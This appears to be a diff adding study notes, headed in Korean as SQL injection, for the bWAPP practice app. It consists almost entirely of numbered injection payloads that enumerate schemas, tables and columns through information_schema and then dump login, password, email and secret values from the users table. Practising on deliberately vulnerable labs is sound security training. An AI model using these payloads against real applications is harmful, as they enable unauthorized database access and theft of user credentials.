@@ -1,0 +1,36 @@
+ 4) SQL 인젝션
+
+ ② 
+
+abcd', (select schema_name from information_schema.schemata))#	
+
+
+ ③ 
+
+abcd', (select database())) #
+abcd', (select schema_name from information_schema.schemata limit 0,1)) #
+abcd', (select schema_name from information_schema.schemata limit 1,1)) #
+
+
+ ④ 
+
+abcd', (select table_name from information_schema.tables where table_schema="bWAPP" limit 0,1)) #	
+abcd', (select table_name from information_schema.tables where table_schema="bWAPP" limit 1,1)) #
+abcd', (select table_name from information_schema.tables where table_schema="bWAPP" limit 2,1)) #
+abcd', (select table_name from information_schema.tables where table_schema="bWAPP" limit 3,1)) #
+abcd', (select table_name from information_schema.tables where table_schema="bWAPP" limit 4,1)) #
+
+
+ ⑤ 
+
+abcd', (select column_name from information_schema.columns where table_name='users' limit 0,1)) #
+abcd', (select column_name from information_schema.columns where table_name='users' limit 1,1)) #
+abcd', (select column_name from information_schema.columns where table_name='users' limit 2,1)) #
+abcd', (select column_name from information_schema.columns where table_name='users' limit 3,1)) #
+abcd', (select column_name from information_schema.columns where table_name='users' limit 4,1)) #
+
+
+ ⑥ 
+
+abcd', (select concat(login,password,email,secret) from users limit 0,1)) #
+abcd', (select concat(login,password,email,secret) from users limit 1,1)) #
